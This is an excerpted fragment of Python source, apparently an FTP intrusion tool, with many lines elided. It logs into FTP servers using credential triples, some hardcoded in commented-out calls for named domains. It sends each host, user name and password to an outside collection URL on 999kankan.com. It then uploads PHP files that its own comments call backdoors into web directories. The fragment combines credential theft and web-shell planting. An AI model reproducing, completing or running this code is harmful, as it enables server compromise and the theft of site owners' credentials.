...
class CS_linkftp(threading.Thread):
    ...
    def run(self):
        try:
            ...
            #self.admin_open_FTP("www.tzxctz.com","www","mnbvcxz")#遍历数组
            #self.admin_open_FTP("bbs.433125.com","433125","433125.com")#遍历数组
        except:
...
###################################
    ...
    def Aftp_upload(self,ftpU,ftp_download): #上传后门文件
        file=self.sjzf()
        file+=".php"
        try:
            bufsize = 1024
            fp = open(self.HM_data,'rb')
    ...
    def admin_open_FTP(self,host,user,passwd):#遍历数组
        try:
            ...
            try:
                ...
                URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(host,user,passwd)
                ...
                while E < len(self.LS.list_2):
                    ...
                    if self.ftp_upload(ftp,self.LS.list_2[E]): #上传文件
                        if self.post_url_data(host):  #验证路径是否正确
                            ...
                            data=self.Aftp_upload(ftp,self.LS.list_2[E]) #上传后门
#                            http="http://"+host+"/"+data
